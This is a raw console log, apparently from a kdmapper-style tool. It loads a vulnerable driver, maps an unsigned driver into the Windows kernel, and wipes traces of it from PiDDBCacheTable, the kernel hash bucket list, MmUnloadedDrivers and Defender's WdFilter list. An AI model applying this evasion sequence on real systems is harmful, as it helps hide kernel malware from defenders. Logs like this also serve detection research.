[<] Loading vulnerable driver, Name: PDFjtmpxlPT
[+] NtLoadDriver Status 0x0
[+] PiDDBLock found with second pattern
[+] PiDDBLock Ptr 0xfffff8026624114a
[+] PiDDBCacheTable Ptr 0xfffff80266088318
[+] PiDDBLock Locked
[+] Found Table Entry = 0xFFFFE00917AA1340
[+] PiDDBCacheTable Cleaned
[+] g_KernelHashBucketList Found 0xFFFFF80268ED0080
[+] g_HashCacheLock Locked
[+] Found In g_KernelHashBucketList: PDFjtmpxlPT
[+] g_KernelHashBucketList Cleaned
[+] MmUnloadedDrivers Cleaned: PDFjtmpxlPT
[+] Found WdFilter MpFreeDriverInfoEx with second pattern
[+] WdFilterDriverList Cleaned: \Users\Issac\AppData\Local\Temp\PDFjtmpxlPT
[+] Image base has been allocated at 0xFFFFB68385110000
[+] Skipped 0x1000 bytes of PE Header
[+] Load config directory wasn't found, probably StackCookie not defined, fix cookie skipped
[<] Calling DriverEntry 0xFFFFB68385110060
[+] Callback example called
[+] DriverEntry returned 0x0
[<] Unloading vulnerable driver
[+] NtUnloadDriver Status 0x0
[+] Vul driver data destroyed before unlink
[+] success
